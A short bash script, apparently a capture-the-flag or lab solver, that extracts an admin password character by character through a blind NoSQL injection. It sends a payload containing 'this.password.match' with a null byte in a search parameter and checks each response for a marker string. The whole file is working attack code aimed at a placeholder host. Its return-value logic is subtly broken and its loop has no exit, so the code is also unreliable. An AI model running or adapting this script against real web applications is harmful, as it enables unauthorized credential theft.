#!/usr/bin/bash

host='HOST_HERE'
query="?search=admin'%%26%%26this.password.match(/^%s/)%%00"
search='>admin<'

req="$host$query"

function matches() {
	url=$(printf "$req" $1)
	response=$(curl -s $url)
	isFound=$(echo $response | grep -q $search)

	return $isFound
}

function walk() {
	for char in {{a..z},{0..9},'-'}; do
		guess="$1$char"
		if matches $guess; then
			echo $guess
			break
		fi
	done	
}

key=''
while true; do
	key=$(walk $key)
	echo $key
done
